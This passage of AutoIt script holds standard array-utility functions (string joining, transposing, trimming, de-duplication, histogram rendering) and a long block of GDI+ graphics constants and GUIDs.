		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return 1
EndFunc

Func _arraytoclip(Const ByRef $aarray, $sdelim_col = "|", $istart_row = -1, $iend_row = -1, $sdelim_row = @CRLF, $istart_col = -1, $iend_col = -1)
	Local $sresult = _arraytostring($aarray, $sdelim_col, $istart_row, $iend_row, $sdelim_row, $istart_col, $iend_col)
	If @error Then Return SetError(@error, 0, 0)
	If ClipPut($sresult) Then Return 1
	Return SetError(-1, 0, 0)
EndFunc

Func _arraytostring(Const ByRef $aarray, $sdelim_col = "|", $istart_row = -1, $iend_row = -1, $sdelim_row = @CRLF, $istart_col = -1, $iend_col = -1)
	If $sdelim_col = Default Then $sdelim_col = "|"
	If $sdelim_row = Default Then $sdelim_row = @CRLF
	If $istart_row = Default Then $istart_row = -1
	If $iend_row = Default Then $iend_row = -1
	If $istart_col = Default Then $istart_col = -1
	If $iend_col = Default Then $iend_col = -1
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	If $istart_row = -1 Then $istart_row = 0
	If $iend_row = -1 Then $iend_row = $idim_1
	If $istart_row < -1 OR $iend_row < -1 Then Return SetError(3, 0, -1)
	If $istart_row > $idim_1 OR $iend_row > $idim_1 Then Return SetError(3, 0, "")
	If $istart_row > $iend_row Then Return SetError(4, 0, -1)
	Local $sret = ""
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			For $i = $istart_row To $iend_row
				$sret &= $aarray[$i] & $sdelim_col
			Next
			Return StringTrimRight($sret, StringLen($sdelim_col))
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns) - 1
			If $istart_col = -1 Then $istart_col = 0
			If $iend_col = -1 Then $iend_col = $idim_2
			If $istart_col < -1 OR $iend_col < -1 Then Return SetError(5, 0, -1)
			If $istart_col > $idim_2 OR $iend_col > $idim_2 Then Return SetError(5, 0, -1)
			If $istart_col > $iend_col Then Return SetError(6, 0, -1)
			For $i = $istart_row To $iend_row
				For $j = $istart_col To $iend_col
					$sret &= $aarray[$i][$j] & $sdelim_col
				Next
				$sret = StringTrimRight($sret, StringLen($sdelim_col)) & $sdelim_row
			Next
			Return StringTrimRight($sret, StringLen($sdelim_row))
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return 1
EndFunc

Func _arraytranspose(ByRef $aarray)
	Switch UBound($aarray, 0)
		Case 0
			Return SetError(2, 0, 0)
		Case 1
			Local $atemp[1][UBound($aarray)]
			For $i = 0 To UBound($aarray) - 1
				$atemp[0][$i] = $aarray[$i]
			Next
			$aarray = $atemp
		Case 2
			Local $idim_1 = UBound($aarray, 1), $idim_2 = UBound($aarray, 2)
			If $idim_1 <> $idim_2 Then
				Local $atemp[$idim_2][$idim_1]
				For $i = 0 To $idim_1 - 1
					For $j = 0 To $idim_2 - 1
						$atemp[$j][$i] = $aarray[$i][$j]
					Next
				Next
				$aarray = $atemp
			Else
				Local $velement
				For $i = 0 To $idim_1 - 1
					For $j = $i + 1 To $idim_2 - 1
						$velement = $aarray[$i][$j]
						$aarray[$i][$j] = $aarray[$j][$i]
						$aarray[$j][$i] = $velement
					Next
				Next
			EndIf
		Case Else
			Return SetError(1, 0, 0)
	EndSwitch
	Return 1
EndFunc

Func _arraytrim(ByRef $aarray, $itrimnum, $idirection = 0, $istart = 0, $iend = 0, $isubitem = 0)
	If $idirection = Default Then $idirection = 0
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If $isubitem = Default Then $isubitem = 0
	If NOT IsArray($aarray) Then Return SetError(1, 0, 0)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	If $iend = 0 Then $iend = $idim_1
	If $istart > $iend Then Return SetError(3, 0, -1)
	If $istart < 0 OR $iend < 0 Then Return SetError(3, 0, -1)
	If $istart > $idim_1 OR $iend > $idim_1 Then Return SetError(3, 0, -1)
	If $istart > $iend Then Return SetError(4, 0, -1)
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If $idirection Then
				For $i = $istart To $iend
					$aarray[$i] = StringTrimRight($aarray[$i], $itrimnum)
				Next
			Else
				For $i = $istart To $iend
					$aarray[$i] = StringTrimLeft($aarray[$i], $itrimnum)
				Next
			EndIf
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns) - 1
			If $isubitem < 0 OR $isubitem > $idim_2 Then Return SetError(5, 0, -1)
			If $idirection Then
				For $i = $istart To $iend
					$aarray[$i][$isubitem] = StringTrimRight($aarray[$i][$isubitem], $itrimnum)
				Next
			Else
				For $i = $istart To $iend
					$aarray[$i][$isubitem] = StringTrimLeft($aarray[$i][$isubitem], $itrimnum)
				Next
			EndIf
		Case Else
			Return SetError(2, 0, 0)
	EndSwitch
	Return 1
EndFunc

Func _arrayunique(Const ByRef $aarray, $icolumn = 0, $ibase = 0, $icase = 0, $icount = $arrayunique_count, $iinttype = $arrayunique_auto)
	If $icolumn = Default Then $icolumn = 0
	If $ibase = Default Then $ibase = 0
	If $icase = Default Then $icase = 0
	If $icount = Default Then $icount = $arrayunique_count
	If UBound($aarray, $ubound_rows) = 0 Then Return SetError(1, 0, 0)
	Local $idims = UBound($aarray, $ubound_dimensions), $inumcolumns = UBound($aarray, $ubound_columns)
	If $idims > 2 Then Return SetError(2, 0, 0)
	If $ibase < 0 OR $ibase > 1 OR (NOT IsInt($ibase)) Then Return SetError(3, 0, 0)
	If $icase < 0 OR $icase > 1 OR (NOT IsInt($icase)) Then Return SetError(3, 0, 0)
	If $icount < 0 OR $icount > 1 OR (NOT IsInt($icount)) Then Return SetError(4, 0, 0)
	If $iinttype < 0 OR $iinttype > 4 OR (NOT IsInt($iinttype)) Then Return SetError(5, 0, 0)
	If $icolumn < 0 OR ($inumcolumns = 0 AND $icolumn > 0) OR ($inumcolumns > 0 AND $icolumn >= $inumcolumns) Then Return SetError(6, 0, 0)
	If $iinttype = $arrayunique_auto Then
		Local $bint, $svartype
		If $idims = 1 Then
			$bint = IsInt($aarray[$ibase])
			$svartype = VarGetType($aarray[$ibase])
		Else
			$bint = IsInt($aarray[$ibase][$icolumn])
			$svartype = VarGetType($aarray[$ibase][$icolumn])
		EndIf
		If $bint AND $svartype = "Int64" Then
			$iinttype = $arrayunique_force64
		Else
			$iinttype = $arrayunique_force32
		EndIf
	EndIf
	ObjEvent("AutoIt.Error", __arrayunique_autoerrfunc)
	Local $odictionary = ObjCreate("Scripting.Dictionary")
	$odictionary.comparemode = Number(NOT $icase)
	Local $velem, $stype, $vkey, $bcomerror = False
	For $i = $ibase To UBound($aarray) - 1
		If $idims = 1 Then
			$velem = $aarray[$i]
		Else
			$velem = $aarray[$i][$icolumn]
		EndIf
		Switch $iinttype
			Case $arrayunique_force32
				$odictionary.item($velem)
				If @error Then
					$bcomerror = True
					ExitLoop
				EndIf
			Case $arrayunique_force64
				$stype = VarGetType($velem)
				If $stype = "Int32" Then
					$bcomerror = True
					ExitLoop
				EndIf
				$vkey = "#" & $stype & "#" & String($velem)
				If NOT $odictionary.item($vkey) Then
					$odictionary($vkey) = $velem
				EndIf
			Case $arrayunique_match
				$stype = VarGetType($velem)
				If StringLeft($stype, 3) = "Int" Then
					$vkey = "#Int#" & String($velem)
				Else
					$vkey = "#" & $stype & "#" & String($velem)
				EndIf
				If NOT $odictionary.item($vkey) Then
					$odictionary($vkey) = $velem
				EndIf
			Case $arrayunique_distinct
				$vkey = "#" & VarGetType($velem) & "#" & String($velem)
				If NOT $odictionary.item($vkey) Then
					$odictionary($vkey) = $velem
				EndIf
		EndSwitch
	Next
	Local $avalues, $j = 0
	If $bcomerror Then
		Return SetError(7, 0, 0)
	ElseIf $iinttype <> $arrayunique_force32 Then
		Local $avalues[$odictionary.count]
		For $vkey In $odictionary.keys()
			$avalues[$j] = $odictionary($vkey)
			If StringLeft($vkey, 5) = "#Ptr#" Then
				$avalues[$j] = Ptr($avalues[$j])
			EndIf
			$j += 1
		Next
	Else
		$avalues = $odictionary.keys()
	EndIf
	If $icount Then
		_arrayinsert($avalues, 0, $odictionary.count)
	EndIf
	Return $avalues
EndFunc

Func _array1dtohistogram($aarray, $isizing = 100)
	If UBound($aarray, 0) > 1 Then Return SetError(1, 0, "")
	$isizing = $isizing * 8
	Local $t, $n, $imin = 0, $imax = 0, $ioffset = 0
	For $i = 0 To UBound($aarray) - 1
		$t = $aarray[$i]
		$t = IsNumber($t) ? Round($t) : 0
		If $t < $imin Then $imin = $t
		If $t > $imax Then $imax = $t
	Next
	Local $irange = Int(Round(($imax - $imin) / 8)) * 8
	Local $ispaceratio = 4
	For $i = 0 To UBound($aarray) - 1
		$t = $aarray[$i]
		If $t Then
			$n = Abs(Round(($isizing * $t) / $irange) / 8)
			$aarray[$i] = ""
			If $t > 0 Then
				If $imin Then
					$ioffset = Int(Abs(Round(($isizing * $imin) / $irange) / 8) / 8 * $ispaceratio)
					$aarray[$i] = __array_stringrepeat(ChrW(32), $ioffset)
				EndIf
			Else
				If $imin <> $t Then
					$ioffset = Int(Abs(Round(($isizing * ($t - $imin)) / $irange) / 8) / 8 * $ispaceratio)
					$aarray[$i] = __array_stringrepeat(ChrW(32), $ioffset)
				EndIf
			EndIf
			$aarray[$i] &= __array_stringrepeat(ChrW(9608), Int($n / 8))
			$n = Mod($n, 8)
			If $n > 0 Then $aarray[$i] &= ChrW(9608 + 8 - $n)
			$aarray[$i] &= " " & $t
		Else
			$aarray[$i] = ""
		EndIf
	Next
	Return $aarray
EndFunc

Func __array_stringrepeat($sstring, $irepeatcount)
	$irepeatcount = Int($irepeatcount)
	If StringLen($sstring) < 1 OR $irepeatcount <= 0 Then Return SetError(1, 0, "")
	Local $sresult = ""
	While $irepeatcount > 1
		If BitAND($irepeatcount, 1) Then $sresult &= $sstring
		$sstring &= $sstring
		$irepeatcount = BitShift($irepeatcount, 1)
	WEnd
	Return $sstring & $sresult
EndFunc

Func __array_exeterinternal(ByRef $aarray, $istart, $isize, $sdelimiter, ByRef $aidx, ByRef $aresult, ByRef $icount)
	If $istart == $isize - 1 Then
		For $i = 0 To $isize - 1
			$aresult[$icount] &= $aarray[$aidx[$i]] & $sdelimiter
		Next
		If $sdelimiter <> "" Then $aresult[$icount] = StringTrimRight($aresult[$icount], StringLen($sdelimiter))
		$icount += 1
	Else
		Local $itemp
		For $i = $istart To $isize - 1
			$itemp = $aidx[$i]
			$aidx[$i] = $aidx[$istart]
			$aidx[$istart] = $itemp
			__array_exeterinternal($aarray, $istart + 1, $isize, $sdelimiter, $aidx, $aresult, $icount)
			$aidx[$istart] = $aidx[$i]
			$aidx[$i] = $itemp
		Next
	EndIf
EndFunc

Func __array_combinations($in, $ir)
	Local $i_total = 1
	For $i = $ir To 1 Step -1
		$i_total *= ($in / $i)
		$in -= 1
	Next
	Return Round($i_total)
EndFunc

Func __array_getnext($in, $ir, ByRef $ileft, $itotal, ByRef $aidx)
	If $ileft == $itotal Then
		$ileft -= 1
		Return 
	EndIf
	Local $i = $ir - 1
	While $aidx[$i] == $in - $ir + $i
		$i -= 1
	WEnd
	$aidx[$i] += 1
	For $j = $i + 1 To $ir - 1
		$aidx[$j] = $aidx[$i] + $j - $i
	Next
	$ileft -= 1
EndFunc

Func __array_minmaxindex(Const ByRef $aarray, $icompnumeric, $istart, $iend, $isubitem, $fucomparison)
	If $icompnumeric = Default Then $icompnumeric = 0
	If $icompnumeric <> 1 Then $icompnumeric = 0
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If $isubitem = Default Then $isubitem = 0
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	If $idim_1 < 0 Then Return SetError(1, 0, -1)
	If $iend = -1 Then $iend = $idim_1
	If $istart = -1 Then $istart = 0
	If $istart < -1 OR $iend < -1 Then Return SetError(3, 0, -1)
	If $istart > $idim_1 OR $iend > $idim_1 Then Return SetError(3, 0, -1)
	If $istart > $iend Then Return SetError(4, 0, -1)
	If $idim_1 < 0 Then Return SetError(5, 0, -1)
	Local $imaxminindex = $istart
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If $icompnumeric Then
				For $i = $istart To $iend
					If $fucomparison(Number($aarray[$i]), Number($aarray[$imaxminindex])) Then $imaxminindex = $i
				Next
			Else
				For $i = $istart To $iend
					If $fucomparison($aarray[$i], $aarray[$imaxminindex]) Then $imaxminindex = $i
				Next
			EndIf
		Case 2
			If $isubitem < 0 OR $isubitem > UBound($aarray, $ubound_columns) - 1 Then Return SetError(6, 0, -1)
			If $icompnumeric Then
				For $i = $istart To $iend
					If $fucomparison(Number($aarray[$i][$isubitem]), Number($aarray[$imaxminindex][$isubitem])) Then $imaxminindex = $i
				Next
			Else
				For $i = $istart To $iend
					If $fucomparison($aarray[$i][$isubitem], $aarray[$imaxminindex][$isubitem]) Then $imaxminindex = $i
				Next
			EndIf
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return $imaxminindex
EndFunc

Func __array_greaterthan($vvalue1, $vvalue2)
	Return $vvalue1 > $vvalue2
EndFunc

Func __array_lessthan($vvalue1, $vvalue2)
	Return $vvalue1 < $vvalue2
EndFunc

Func __arrayunique_autoerrfunc()
EndFunc

Global Const $gdip_dashcapflat = 0
Global Const $gdip_dashcapround = 2
Global Const $gdip_dashcaptriangle = 3
Global Const $gdip_dashstylesolid = 0
Global Const $gdip_dashstyledash = 1
Global Const $gdip_dashstyledot = 2
Global Const $gdip_dashstyledashdot = 3
Global Const $gdip_dashstyledashdotdot = 4
Global Const $gdip_dashstylecustom = 5
Global Const $gdip_epgchrominancetable = "{F2E455DC-09B3-4316-8260-676ADA32481C}"
Global Const $gdip_epgcolordepth = "{66087055-AD66-4C7C-9A18-38A2310B8337}"
Global Const $gdip_epgcompression = "{E09D739D-CCD4-44EE-8EBA-3FBF8BE4FC58}"
Global Const $gdip_epgluminancetable = "{EDB33BCE-0266-4A77-B904-27216099E717}"
Global Const $gdip_epgquality = "{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}"
Global Const $gdip_epgrendermethod = "{6D42C53A-229A-4825-8BB7-5C99E2B9A8B8}"
Global Const $gdip_epgsaveflag = "{292266FC-AC40-47BF-8CFC-A85B89A655DE}"
Global Const $gdip_epgscanmethod = "{3A4E2661-3109-4E56-8536-42C156E7DCFA}"
Global Const $gdip_epgtransformation = "{8D0EB2D1-A58E-4EA8-AA14-108074B7B6F9}"
Global Const $gdip_epgversion = "{24D18C76-814A-41A4-BF53-1C219CCCF797}"
Global Const $gdip_eptbyte = 1
Global Const $gdip_eptascii = 2
Global Const $gdip_eptshort = 3
Global Const $gdip_eptlong = 4
Global Const $gdip_eptrational = 5
Global Const $gdip_eptlongrange = 6
Global Const $gdip_eptundefined = 7
Global Const $gdip_eptrationalrange = 8
Global Const $gdip_errok = 0
Global Const $gdip_errgenericerror = 1
Global Const $gdip_errinvalidparameter = 2
Global Const $gdip_erroutofmemory = 3
Global Const $gdip_errobjectbusy = 4
Global Const $gdip_errinsufficientbuffer = 5
Global Const $gdip_errnotimplemented = 6
Global Const $gdip_errwin32error = 7
Global Const $gdip_errwrongstate = 8
Global Const $gdip_erraborted = 9
Global Const $gdip_errfilenotfound = 10
Global Const $gdip_errvalueoverflow = 11
Global Const $gdip_erraccessdenied = 12
Global Const $gdip_errunknownimageformat = 13
Global Const $gdip_errfontfamilynotfound = 14
Global Const $gdip_errfontstylenotfound = 15
Global Const $gdip_errnottruetypefont = 16
Global Const $gdip_errunsupportedgdiversion = 17
Global Const $gdip_errgdiplusnotinitialized = 18
Global Const $gdip_errpropertynotfound = 19
Global Const $gdip_errpropertynotsupported = 20
Global Const $gdip_evtcompressionlzw = 2
Global Const $gdip_evtcompressionccitt3 = 3
Global Const $gdip_evtcompressionccitt4 = 4
Global Const $gdip_evtcompressionrle = 5
Global Const $gdip_evtcompressionnone = 6
Global Const $gdip_evttransformrotate90 = 13
Global Const $gdip_evttransformrotate180 = 14
Global Const $gdip_evttransformrotate270 = 15
Global Const $gdip_evttransformfliphorizontal = 16
Global Const $gdip_evttransformflipvertical = 17
Global Const $gdip_evtmultiframe = 18
Global Const $gdip_evtlastframe = 19
Global Const $gdip_evtflush = 20
Global Const $gdip_evtframedimensionpage = 23
Global Const $gdip_icfencoder = 1
Global Const $gdip_icfdecoder = 2
Global Const $gdip_icfsupportbitmap = 4
Global Const $gdip_icfsupportvector = 8
Global Const $gdip_icfseekableencode = 16
Global Const $gdip_icfblockingdecode = 32
Global Const $gdip_icfbuiltin = 65536
Global Const $gdip_icfsystem = 131072
Global Const $gdip_icfuser = 262144
Global Const $gdip_ilmread = 1
Global Const $gdip_ilmwrite = 2
Global Const $gdip_ilmuserinputbuf = 4
Global Const $gdip_linecapflat = 0
Global Const $gdip_linecapsquare = 1
Global Const $gdip_linecapround = 2
Global Const $gdip_linecaptriangle = 3
Global Const $gdip_linecapnoanchor = 16
Global Const $gdip_linecapsquareanchor = 17
Global Const $gdip_linecaproundanchor = 18
Global Const $gdip_linecapdiamondanchor = 19
Global Const $gdip_linecaparrowanchor = 20
Global Const $gdip_linecapcustom = 255
Global Const $gdip_pxf01indexed = 196865
Global Const $gdip_pxf04indexed = 197634
Global Const $gdip_pxf08indexed = 198659
Global Const $gdip_pxf16grayscale = 1052676
Global Const $gdip_pxf16rgb555 = 135173
Global Const $gdip_pxf16rgb565 = 135174
Global Const $gdip_pxf16argb1555 = 397319
Global Const $gdip_pxf24rgb = 137224
Global Const $gdip_pxf32rgb = 139273
Global Const $gdip_pxf32argb = 2498570
Global Const $gdip_pxf32pargb = 925707
Global Const $gdip_pxf48rgb = 1060876
Global Const $gdip_pxf64argb = 3424269
Global Const $gdip_pxf64pargb = 1720334
Global Const $gdip_imageformat_undefined = "{B96B3CA9-0728-11D3-9D7B-0000F81EF32E}"
Global Const $gdip_imageformat_memorybmp = "{B96B3CAA-0728-11D3-9D7B-0000F81EF32E}"
Global Const $gdip_imageformat_bmp = "{B96B3CAB-0728-11D3-9D7B-0000F81EF32E}"
Global Const $gdip_imageformat_emf = "{B96B3CAC-0728-11D3-9D7B-0000F81EF32E}"
Global Const $gdip_imageformat_wmf = "{B96B3CAD-0728-11D3-9D7B-0000F81EF32E}"
Global Const $gdip_imageformat_jpeg = "{B96B3CAE-0728-11D3-9D7B-0000F81EF32E}"
Global Const $gdip_imageformat_png = "{B96B3CAF-0728-11D3-9D7B-0000F81EF32E}"
Global Const $gdip_imageformat_gif = "{B96B3CB0-0728-11D3-9D7B-0000F81EF32E}"
Global Const $gdip_imageformat_tiff = "{B96B3CB1-0728-11D3-9D7B-0000F81EF32E}"
Global Const $gdip_imageformat_exif = "{B96B3CB2-0728-11D3-9D7B-0000F81EF32E}"
Global Const $gdip_imageformat_icon = "{B96B3CB5-0728-11D3-9D7B-0000F81EF32E}"
Global Const $gdip_imagetype_unknown = 0
Global Const $gdip_imagetype_bitmap = 1
Global Const $gdip_imagetype_metafile = 2
Global Const $gdip_imageflags_none = 0
Global Const $gdip_imageflags_scalable = 1
Global Const $gdip_imageflags_hasalpha = 2
Global Const $gdip_imageflags_hastranslucent = 4
Global Const $gdip_imageflags_partiallyscalable = 8
Global Const $gdip_imageflags_colorspace_rgb = 16
Global Const $gdip_imageflags_colorspace_cmyk = 32
Global Const $gdip_imageflags_colorspace_gray = 64
Global Const $gdip_imageflags_colorspace_ycbcr = 128
Global Const $gdip_imageflags_colorspace_ycck = 256
Global Const $gdip_imageflags_hasrealdpi = 4096
Global Const $gdip_imageflags_hasrealpixelsize = 8192
Global Const $gdip_imageflags_readonly = 65536
Global Const $gdip_imageflags_caching = 131072
Global Const $gdip_smoothingmode_invalid = -1
Global Const $gdip_smoothingmode_default = 0
Global Const $gdip_smoothingmode_highspeed = 1
Global Const $gdip_smoothingmode_highquality = 2
Global Const $gdip_smoothingmode_none = 3
Global Const $gdip_smoothingmode_antialias8x4 = 4
Global Const $gdip_smoothingmode_antialias = $gdip_smoothingmode_antialias8x4
Global Const $gdip_smoothingmode_antialias8x8 = 5
Global Const $gdip_rlum = 0.3086
Global Const $gdip_glum = 0.6094
Global Const $gdip_blum = 0.082
Global Const $gdip_interpolationmode_invalid = -1
Global Const $gdip_interpolationmode_default = 0
Global Const $gdip_interpolationmode_lowquality = 1
Global Const $gdip_interpolationmode_highquality = 2
Global Const $gdip_interpolationmode_bilinear = 3
Global Const $gdip_interpolationmode_bicubic = 4
Global Const $gdip_interpolationmode_nearestneighbor = 5
Global Const $gdip_interpolationmode_highqualitybilinear = 6
Global Const $gdip_interpolationmode_highqualitybicubic = 7
Global Const $gdip_textrenderinghint_systemdefault = 0
Global Const $gdip_textrenderinghint_singlebitperpixelgridfit = 1
Global Const $gdip_textrenderinghint_singlebitperpixel = 2
Global Const $gdip_textrenderinghint_antialiasgridfit = 3
Global Const $gdip_textrenderinghint_antialias = 4
Global Const $gdip_textrenderinghint_cleartypegridfit = 5
Global Const $gdip_pixeloffsetmode_invalid = -1
Global Const $gdip_pixeloffsetmode_default = 0
Global Const $gdip_pixeloffsetmode_highspeed = 1
Global Const $gdip_pixeloffsetmode_highquality = 2
Global Const $gdip_pixeloffsetmode_none = 3
Global Const $gdip_pixeloffsetmode_half = 4
Global Const $gdip_pensetlinejoin_miter = 0
Global Const $gdip_pensetlinejoin_bevel = 1
Global Const $gdip_pensetlinejoin_round = 2
Global Const $gdip_pensetlinejoin_miterclipped = 3
Global Const $gdip_fillmodealternate = 0
Global Const $gdip_fillmodewinding = 1
Global Const $gdip_qualitymodeinvalid = -1
Global Const $gdip_qualitymodedefault = 0
Global Const $gdip_qualitymodelow = 1
Global Const $gdip_qualitymodehigh = 2
Global Const $gdip_compositingmodesourceover = 0
Global Const $gdip_compositingmodesourcecopy = 1
Global Const $gdip_compositingqualityinvalid = $gdip_qualitymodeinvalid
Global Const $gdip_compositingqualitydefault = $gdip_qualitymodedefault
Global Const $gdip_compositingqualityhighspeed = $gdip_qualitymodelow
Global Const $gdip_compositingqualityhighquality = $gdip_qualitymodehigh
Global Const $gdip_compositingqualitygammacorrected = 3
Global Const $gdip_compositingqualityassumelinear = 4
Global Const $gdip_hatchstyle_horizontal = 0
Global Const $gdip_hatchstyle_vertical = 1
Global Const $gdip_hatchstyle_forwarddiagonal = 2
Global Const $gdip_hatchstyle_backwarddiagonal = 3
Global Const $gdip_hatchstyle_cross = 4
Global Const $gdip_hatchstyle_diagonalcross = 5
Global Const $gdip_hatchstyle_05percent = 6
Global Const $gdip_hatchstyle_10percent = 7
Global Const $gdip_hatchstyle_20percent = 8
Global Const $gdip_hatchstyle_25percent = 9
Global Const $gdip_hatchstyle_30percent = 10
Global Const $gdip_hatchstyle_40percent = 11
Global Const $gdip_hatchstyle_50percent = 12
Global Const $gdip_hatchstyle_60percent = 13
Global Const $gdip_hatchstyle_70percent = 14
Global Const $gdip_hatchstyle_75percent = 15
Global Const $gdip_hatchstyle_80percent = 16
Global Const $gdip_hatchstyle_90percent = 17
Global Const $gdip_hatchstyle_lightdownwarddiagonal = 18
Global Const $gdip_hatchstyle_lightupwarddiagonal = 19
Global Const $gdip_hatchstyle_darkdownwarddiagonal = 20
Global Const $gdip_hatchstyle_darkupwarddiagonal = 21
Global Const $gdip_hatchstyle_widedownwarddiagonal = 22
Global Const $gdip_hatchstyle_wideupwarddiagonal = 23
Global Const $gdip_hatchstyle_lightvertical = 24
Global Const $gdip_hatchstyle_lighthorizontal = 25
Global Const $gdip_hatchstyle_narrowvertical = 26
Global Const $gdip_hatchstyle_narrowhorizontal = 27
Global Const $gdip_hatchstyle_darkvertical = 28
Global Const $gdip_hatchstyle_darkhorizontal = 29
Global Const $gdip_hatchstyle_dasheddownwarddiagonal = 30
Global Const $gdip_hatchstyle_dashedupwarddiagonal = 31
Global Const $gdip_hatchstyle_dashedhorizontal = 32
Global Const $gdip_hatchstyle_dashedvertical = 33
Global Const $gdip_hatchstyle_smallconfetti = 34
Global Const $gdip_hatchstyle_largeconfetti = 35
Global Const $gdip_hatchstyle_zigzag = 36
Global Const $gdip_hatchstyle_wave = 37
Global Const $gdip_hatchstyle_diagonalbrick = 38
Global Const $gdip_hatchstyle_horizontalbrick = 39
Global Const $gdip_hatchstyle_weave = 40
Global Const $gdip_hatchstyle_plaid = 41
Global Const $gdip_hatchstyle_divot = 42
Global Const $gdip_hatchstyle_dottedgrid = 43
Global Const $gdip_hatchstyle_dotteddiamond = 44
Global Const $gdip_hatchstyle_shingle = 45
Global Const $gdip_hatchstyle_trellis = 46
Global Const $gdip_hatchstyle_sphere = 47
Global Const $gdip_hatchstyle_smallgrid = 48
Global Const $gdip_hatchstyle_smallcheckerboard = 49
Global Const $gdip_hatchstyle_largecheckerboard = 50
Global Const $gdip_hatchstyle_outlineddiamond = 51
Global Const $gdip_hatchstyle_soliddiamond = 52
Global Const $gdip_hatchstyle_total = 53
Global Const $gdip_hatchstyle_largegrid = $gdip_hatchstyle_cross
Global Const $gdip_hatchstyle_min = $gdip_hatchstyle_horizontal
Global Const $gdip_hatchstyle_max = $gdip_hatchstyle_total - 1
Global Const $gdip_blureffectguid = "{633C80A4-1843-482b-9EF2-BE2834C5FDD4}"
Global Const $gdip_sharpeneffectguid = "{63CBF3EE-C526-402c-8F71-62C540BF5142}"
Global Const $gdip_colormatrixeffectguid = "{718F2615-7933-40e3-A511-5F68FE14DD74}"
Global Const $gdip_colorluteffectguid = "{A7CE72A9-0F7F-40d7-B3CC-D0C02D5C3212}"
Global Const $gdip_brightnesscontrasteffectguid = "{D3A1DBE1-8EC4-4c17-9F4C-EA97AD1C343D}"
Global Const $gdip_huesaturationlightnesseffectguid = "{8B2DD6C3-EB07-4d87-A5F0-7108E26A9C5F}"
Global Const $gdip_levelseffectguid = "{99C354EC-2A31-4f3a-8C34-17A803B33A25}"
Global Const $gdip_tinteffectguid = "{1077AF00-2848-4441-9489-44AD4C2D7A2C}"
Global Const $gdip_colorbalanceeffectguid = "{537E597D-251E-48da-9664-29CA496B70F8}"
Global Const $gdip_redeyecorrectioneffectguid = "{74D29D05-69A4-4266-9549-3CC52836B632}"
Global Const $gdip_colorcurveeffectguid = "{DD6A0022-58E4-4a67-9D9B-D48EB881A53D}"
Global Const $gdip_adjustexposure = 0
Global Const $gdip_adjustdensity = 1
Global Const $gdip_adjustcontrast = 2
Global Const $gdip_adjusthighlight = 3
Global Const $gdip_adjustshadow = 4
Global Const $gdip_adjustmidtone = 5
Global Const $gdip_adjustwhitesaturation = 6
Global Const $gdip_adjustblacksaturation = 7
Global Const $gdip_curvechannelall = 0
Global Const $gdip_curvechannelred = 1
Global Const $gdip_curvechannelgreen = 2
Global Const $gdip_curvechannelblue = 3
Global Const $gdip_palettetypecustom = 0
Global Const $gdip_palettetypeoptimal = 1
Global Const $gdip_palettetypefixedbw = 2
Global Const $gdip_palettetypefixedhalftone8 = 3
Global Const $gdip_palettetypefixedhalftone27 = 4
Global Const $gdip_palettetypefixedhalftone64 = 5
Global Const $gdip_palettetypefixedhalftone125 = 6
Global Const $gdip_palettetypefixedhalftone216 = 7
Global Const $gdip_palettetypefixedhalftone252 = 8
Global Const $gdip_palettetypefixedhalftone256 = 9
Global Const $gdip_paletteflagshasalpha = 1
Global Const $gdip_paletteflagsgrayscale = 2
Global Const $gdip_paletteflagshalftone = 4
Global Const $gdip_dithertypenone = 0
Global Const $gdip_dithertypesolid = 1
Global Const $gdip_dithertypeordered4x4 = 2
Global Const $gdip_dithertypeordered8x8 = 3
Global Const $gdip_dithertypeordered16x16 = 4
Global Const $gdip_dithertypeordered91x91 = 5
Global Const $gdip_dithertypespiral4x4 = 6
Global Const $gdip_dithertypespiral8x8 = 7
Global Const $gdip_dithertypedualspiral4x4 = 8
Global Const $gdip_dithertypedualspiral8x8 = 9
Global Const $gdip_dithertypeerrordiffusion = 10
Global Const $gdip_dithertypemax = 10
Global Const $gdip_histogramformatargb = 0
Global Const $gdip_histogramformatpargb = 1
Global Const $gdip_histogramformatrgb = 2
Global Const $gdip_histogramformatgray = 3
Global Const $gdip_histogramformatb = 4
Global Const $gdip_histogramformatg = 5
Global Const $gdip_histogramformatr = 6
Global Const $gdip_histogramformata = 7
Global Const $gdip_textrenderinghintsystemdefault = 0
Global Const $gdip_textrenderinghintsinglebitperpixelgridfit = 1
Global Const $gdip_textrenderinghintsinglebitperpixel = 2
Global Const $gdip_textrenderinghintantialiasgridfit = 3
Global Const $gdip_textrenderinghintantialias = 4
Global Const $gdip_textrenderinghintcleartypegridfit = 5
Global Const $gdip_rotatenoneflipnone = 0
Global Const $gdip_rotate90flipnone = 1
Global Const $gdip_rotate180flipnone = 2
Global Const $gdip_rotate270flipnone = 3
Global Const $gdip_rotatenoneflipx = 4
Global Const $gdip_rotate90flipx = 5
Global Const $gdip_rotate180flipx = 6
Global Const $gdip_rotate270flipx = 7
Global Const $gdip_rotatenoneflipy = $gdip_rotate180flipx
Global Const $gdip_rotate90flipy = $gdip_rotate270flipx
Global Const $gdip_rotate180flipy = $gdip_rotatenoneflipx
Global Const $gdip_rotate270flipy = $gdip_rotate90flipx
Global Const $gdip_rotatenoneflipxy = $gdip_rotate180flipnone
Global Const $gdip_rotate90flipxy = $gdip_rotate270flipnone
Global Const $gdip_rotate270flipxy = $gdip_rotate90flipnone
Global Const $gdip_framedimension_time = "{6AEDBD6D-3FB5-418A-83A6-7F45229DC872}"
Global Const $gdip_framedimension_resolution = "{84236F7B-3BD3-428F-8DAB-4EA1439CA315}"
Global Const $gdip_framedimension_page = "{7462DC86-6180-4C7E-8E3F-EE7333A7A483}"
Global Const $gdip_coloradjusttype_default = 0
Global Const $gdip_coloradjusttype_bitmap = 1
Global Const $gdip_coloradjusttype_brush = 2
